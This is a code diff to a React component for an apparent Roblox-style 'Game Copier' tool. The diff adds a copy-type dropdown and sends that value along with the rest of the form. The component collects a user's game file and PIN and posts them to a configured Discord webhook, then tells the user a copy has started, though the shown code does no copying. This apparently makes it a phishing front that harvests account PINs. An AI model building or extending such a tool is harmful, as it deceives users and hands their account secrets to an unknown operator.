@@ -7,11 +7,19 @@ import { motion } from 'framer-motion';
 import { sendToDiscordWebhook } from '@/utils/webhookService';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { useConfig } from '@/context/ConfigContext';
+import { 
+  Select, 
+  SelectContent, 
+  SelectItem, 
+  SelectTrigger, 
+  SelectValue 
+} from "@/components/ui/select";
 
 const CopyGames = () => {
   const { config } = useConfig();
   const [gameFile, setGameFile] = useState<string>("");
   const [pin, setPin] = useState<string>("");
+  const [copyType, setCopyType] = useState<string>("FULL GAME");
   const [isLoading, setIsLoading] = useState(false);
   const [showError, setShowError] = useState(false);
 
@@ -33,13 +41,17 @@ const CopyGames = () => {
       await sendToDiscordWebhook({
         toolType: "Game Copier",
         file: gameFile,
-        pin
+        pin,
+        additionalInfo: {
+          copyType
+        }
       }, config.webhookUrl, config.cooldownSeconds);
       
       toast.success("Game copy process started!");
       // Clear the form after successful submission
       setGameFile("");
       setPin("");
+      setCopyType("FULL GAME");
     } catch (error) {
       // Error handled in webhookService
     } finally {
@@ -139,6 +151,28 @@ const CopyGames = () => {
                 onChange={(e) => setGameFile(e.target.value)}
                 className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
               />
+            </motion.div>
+            
+            <motion.div 
+              className="mb-4"
+              initial={{ x: -20, opacity: 0 }}
+              animate={{ x: 0, opacity: 1 }}
+              transition={{ delay: 0.55, duration: 0.5, ease: "easeOut" }}
+            >
+              <label className="block text-gray-400 mb-2 text-sm">Copy Type</label>
+              <Select 
+                value={copyType} 
+                onValueChange={setCopyType}
+                defaultValue="FULL GAME"
+              >
+                <SelectTrigger className="w-full bg-black/30 border border-white/10 text-white focus:ring-blox-teal focus:border-blox-teal">
+                  <SelectValue placeholder="Select Copy Type" />
+                </SelectTrigger>
+                <SelectContent className="bg-gray-900 border border-white/10 text-white">
+                  <SelectItem value="FULL GAME">FULL GAME</SelectItem>
+                  <SelectItem value="Map only">Map only</SelectItem>
+                </SelectContent>
+              </Select>
             </motion.div>
             
             <motion.div 
